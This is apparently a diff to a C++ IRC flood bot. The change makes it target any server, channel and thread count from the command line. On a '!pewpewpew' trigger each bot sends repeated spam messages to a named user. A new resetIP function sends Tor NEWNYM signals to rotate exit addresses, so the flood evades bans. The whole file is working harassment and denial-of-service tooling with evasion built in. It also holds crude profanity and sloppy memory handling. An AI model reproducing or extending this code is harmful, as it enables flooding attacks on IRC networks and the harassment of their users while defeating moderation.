@@ -16,9 +16,11 @@
 using namespace std;
 
 char *shift( int mov, char * array, int size );
-void fuck( char * nick, int i );
-// int arraysize( char * array );
+void irc_connect( const char * server, const char * port, const char * channel, const char * nick, int num );
+void resetIP( );
+
 /**
+
 This code is sorta fucked right now. It works but there is a room for improvement
 g++ -o first first.cpp -std=c++11 -lboost_regex -pthread -lpthread -Wl,--no-as-needed
 
@@ -28,9 +30,9 @@ class Socket{
 	
 	private:
 		char buffer[MAXSIZE];
+		int sock;
 
 	public:
-		int sock;
 		int SockCon( const char *host , const char *port ){
 
 			struct addrinfo hints, *addr;
@@ -69,6 +71,7 @@ class Socket{
 			if(writeS( sock, buff ) == -1 ) throw "Connection closed";
 			memset(&buff, 0, sizeof(buff));
 		}
+
 		~Socket(){
 		
 			close(sock);
@@ -80,62 +83,60 @@ class IRC: public Socket{
 
 
 	public:
-		char *name;
-		char *chan;
 		void connect(const char *host , const char *port, const char *n, const char *channel){
 
 			name =  (char *)n;
 			chan = (char *)channel; 
-			Socket::SockCon( host , port );
+			SockCon( host , port );
 			main();
-			
-
-		}
-//	private: // will be private when im done testing
-		void pong( char *data, int size ){
- 
-			char buff[MAXSIZE];
-			char *x = shift(5, data, size);
-			sprintf(buff, "PONG %s", x );
-			free(x);
-			Socket::sendData( buff );
-			memset(&buff, 0, sizeof(buff));
-
 		}
 		void privmsg( char *who, const char *data = "Trolololololo"){
 
 			char buff[MAXSIZE];
 			sprintf(buff, "PRIVMSG %s :%s ", who ,data);
-			Socket::sendData( buff );
-			memset(&buff, 0, sizeof(buff));
-			
+			sendData( buff );
+			memset(&buff, 0, sizeof(buff));	
 		}
 		void join( char *chan ){
 
 			char buff[MAXSIZE];
 			sprintf(buff, "JOIN %s", chan);
-			Socket::sendData( buff );
+			sendData( buff );
 			memset(&buff, 0 , sizeof(buff));
 		}
 		void part(  char *chan, const char * msg = "Leaving"){
 
 			char buff[MAXSIZE];
 			sprintf(buff, "PART %s :%s", chan, msg);
-			Socket::sendData( buff );
+			sendData( buff );
 			memset(&buff, 0 , sizeof(buff));	
 		}
 		void nick( char *n ){
 
 			char buff[MAXSIZE];
 			sprintf(buff, "NICK %s", n);
-			Socket::sendData( buff );
+			sendData( buff );
 			memset(&buff, 0 , sizeof(buff));
+		}
+	private: 
+		char *name;
+		char *chan;
+		bool spam = false;
+		char *who;
+		void pong( char *data, int size ){
+ 
+			char buff[MAXSIZE];
+			char *x = shift(5, data, size);
+			sprintf(buff, "PONG %s", x );
+			free(x);
+			sendData( buff );
+			memset(&buff, 0, sizeof(buff));
 		}
 		void user( const char *user = " Ass Ass  Ass ASs" ){
 
 			char buff[MAXSIZE];
 			sprintf(buff, "USER %s", user);
-			Socket::sendData( buff );
+			sendData( buff );
 			memset(&buff, 0 , sizeof(buff));
 		}
 		void main( )
@@ -145,7 +146,8 @@ class IRC: public Socket{
 			user();
 
 			while( 1 ){
-				char * buff = Socket::getData();
+
+				char * buff = getData();
 				cout << buff;
 				if ( strstr( buff, "004") !=NULL )
 				{	
@@ -167,10 +169,9 @@ class IRC: public Socket{
 			}
 
 			join( chan );
-			bool spam = false;
-			char *who;
+
 			while( 1 ){
-				char * buff = Socket::getData();
+				char * buff = getData();
 				cout << buff;
 				if( strstr( buff, "PING :") !=NULL )
 				{
@@ -183,7 +184,8 @@ class IRC: public Socket{
 					boost::smatch result;
 					if (boost::regex_search(shit, result, pattern))
 					{
-						if(result[4] == "!pewpewpew"){
+						if(result[4] == "!pewpewpew")
+						{
 							cout << "Spamming: " << result[5] << endl;
 							spam = true;
 							string damm(result[5]);
@@ -196,12 +198,16 @@ class IRC: public Socket{
 						}
 					}
 
-				}if ( spam == true )
+				}
+				if ( spam == true )
 				{
-					for(int xyz = 0; xyz < 20; xyz++){
-						privmsg(who);
-					}
+
+					for(int xyz = 0; xyz < 20; xyz++) privmsg(who);
 					sleep(2);
+				}
+				else if ( who != NULL)
+				{
+					memset(&who, 0 , sizeof( who ));
 				}
 				memset(&buff, 0 , sizeof(buff));
 
@@ -210,20 +216,30 @@ class IRC: public Socket{
 
 
 };
-int main(){
+
+int main(int argc, char const *argv[]){
+	if (argc < 5 )
+	{
+		cout << "Usage: " << argv[0] << " <irc> <port> <channel> <threads>" << endl;
+		return -1;
+	}
+
 	try{
 
-		for(int i = 0; i < 4 ; i++){
-			char nick[MAXSIZE];
-			sprintf(nick, "poop%i", i);
-			cout << nick;
-			thread first(fuck, nick , i);
+		const char nick[20] = "poop";
+		for(int i = 0; i < atoi(argv[4]) ; i++){
+
+			if ( i % 5 == 0) resetIP();
+			thread first(irc_connect, argv[1], argv[2], argv[3], nick, i); //  [] ( char * nick , int num ) ->{  ...  }
 			first.detach();
-		}
-		while(1){
-			sleep(1);
+
 		}
 
+		while( 1 ){
+
+			sleep(1);
+
+		}
 	}catch( char const* e ){
 
 		cout << "Caught Exception: " << e << endl;
@@ -231,14 +247,24 @@ int main(){
 	}
 	return 0;
 }
-void fuck( char * nick, int num ){
+void irc_connect( const char * server, const char * port, const char * channel, const char * nick, int num ){
+
+
 	char name[MAXSIZE];
 	sprintf(name, "%s%i", nick, num);
-	IRC * irc = new IRC();
-	irc->connect( "localhost", "1234", name, "#flood");  // irc server here
-	//cout << nick;
 	memset(&nick, 0 , sizeof(nick));
-	memset(&name, 0 , sizeof(nick));
+	IRC * irc = new IRC();
+	try{
+
+		irc->connect( server, port, name, channel);
+
+	}catch( char const * e ){
+
+		cout  << name << " Caught Exception: "<< e << endl;
+	}
+	memset(&name, 0 , sizeof(name));
+	delete irc;
+	
 }
 
 char  *shift( int mov, char  * array, int size){
@@ -254,6 +280,14 @@ char  *shift( int mov, char  * array, int size){
 	
 	return n;
 
-
 }
 
+void resetIP( ){
+
+	Socket * s = new Socket();
+	s->SockCon( "localhost", "9051");
+	s->sendData((char *)"AUTHENTICATE"); //cause lazy
+	s->sendData((char *)"SIGNAL NEWNYM");
+	
+	delete s;
+}
